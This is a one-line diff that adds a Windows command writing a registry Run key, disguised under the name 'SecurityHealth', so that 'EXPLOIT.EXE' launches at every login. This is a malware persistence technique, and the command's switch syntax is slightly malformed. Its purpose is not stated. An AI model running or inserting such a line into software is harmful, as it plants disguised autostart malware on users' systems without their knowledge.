@@ -1,0 +1,1 @@
+cmd \c "reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d EXPLOIT.EXE /f"
